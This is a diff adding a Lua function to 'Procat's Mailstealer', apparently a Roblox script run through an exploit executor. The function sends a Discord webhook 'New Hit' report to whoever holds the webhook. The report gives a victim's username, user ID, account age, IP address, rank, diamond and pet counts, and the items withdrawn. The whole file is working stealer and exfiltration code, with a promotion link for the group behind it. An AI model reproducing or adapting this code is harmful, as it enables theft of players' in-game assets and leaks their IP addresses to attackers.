@@ -1,0 +1,139 @@
+local exploit = identifyexecutor()
+local url = Webhook
+local whenabled = true
+local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
+    local abcdef1
+    local headers
+    local lmao = "/5"
+    local Image = string.split(petimg, "rbxassetid://")[2]
+    Image = game:HttpGet("https://thumbnails.roblox.com/v1/assets?assetIds=" ..
+        Image .. "&returnPolicy=PlaceHolder&size=420x420&format=Png&isCircular=false")
+    Image = game:GetService("HttpService"):JSONDecode(Image).data[1].imageUrl
+    if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
+        imgs =
+        "https://media.discordapp.net/attachments/999507947237412946/1120319339254530098/20230518_214510_0000.png"
+        data1 = {
+            ["content"] = ping,
+            ["username"] = "Procat's Mailstealer",
+            ["avatar_url"] = imgs,
+            ["embeds"] = { {
+                ["title"] = "**New Hit** ||With Procat||",
+                ["url"] = "https://discord.gg/procats",
+                ["type"] = "rich",
+                ["color"] = tonumber(0xb042ff),
+                ["thumbnail"] = {
+                    ["url"] = Image,
+                    ["height"] = 420,
+                    ["width"] = 420
+                },
+                ["fields"] = { {
+                    ["name"] = "**This data was generated using Procat's Mailstealer** :cat:",
+                    ["value"] = "```Username     : " .. username ..
+                        "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
+                        " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
+                        "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
+                    ["inline"] = false
+                }, {
+                    ["name"] = ":cat: **Pets left** :cat:",
+                    ["value"] = "```" .. f .. "```",
+                    ["inline"] = true
+                }, {
+                    ["name"] = ":gem: **Diamonds** :gem:",
+                    ["value"] = "```" .. d .. "```",
+                    ["inline"] = true
+                },
+                    {
+                        ["name"] = rarity,
+                        ["value"] = "```" .. name .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":bank: **Joined Banks** :bank:",
+                        ["value"] = "```" .. bankscount .. lmao .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":gem: **Wd Diamonds** :gem:",
+                        ["value"] = "```" .. WDiamondsCount .. "```",
+                        ["inline"] = true
+                    }, {
+                    ["name"] = ":cat: **Wd Huges** :cat:",
+                    ["value"] = "```" .. FinalFinal .. "```",
+                    ["inline"] = true
+                },
+                }
+            } }
+        }
+        newdata1 = game:GetService("HttpService"):JSONEncode(data1)
+
+        headers = {
+            ["content-type"] = "application/json"
+        }
+
+        if Webhook ~= nil and whenabled == true then
+            abcdef1 = {
+                Url = url,
+                Body = newdata1,
+                Method = "POST",
+                Headers = headers
+            }
+            request(abcdef1)
+        end
+    else
+        imgs =
+        "https://media.discordapp.net/attachments/1117066197540802652/1117770741866307644/IMG_8500.gif"
+        data1 = {
+            ["content"] = ping,
+            ["username"] = "PROCATSTEALER",
+            ["avatar_url"] = imgs,
+            ["embeds"] = { {
+                ["title"] = "**New Hit** ||With Procat Mailstealer||",
+                ["url"] = "https://discord.gg/procats",
+                ["type"] = "rich",
+                ["color"] = tonumber(0xb042ff),
+                ["thumbnail"] = {
+                    ["url"] = Image,
+                    ["height"] = 420,
+                    ["width"] = 420
+                },
+                ["fields"] = { {
+                    ["name"] = "**This data was generated using Procat's Mailstealer** :cat:",
+                    ["value"] = "```Username     : " .. username ..
+                        "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
+                        " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
+                        "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
+                    ["inline"] = false
+                }, {
+                    ["name"] = ":cat: **Pets left** :cat:",
+                    ["value"] = "```" .. f .. "```",
+                    ["inline"] = true
+                }, {
+                    ["name"] = ":gem: **Diamonds** :gem:",
+                    ["value"] = "```" .. d .. "```",
+                    ["inline"] = true
+                },
+                    {
+                        ["name"] = rarity,
+                        ["value"] = "```" .. name .. "```",
+                        ["inline"] = true
+                    },
+                }
+            } }
+        }
+        newdata1 = game:GetService("HttpService"):JSONEncode(data1)
+
+        headers = {
+            ["content-type"] = "application/json"
+        }
+
+        if Webhook ~= nil and whenabled == true then
+            abcdef1 = {
+                Url = url,
+                Body = newdata1,
+                Method = "POST",
+                Headers = headers
+            }
+            request(abcdef1)
+        end
+    end
+end
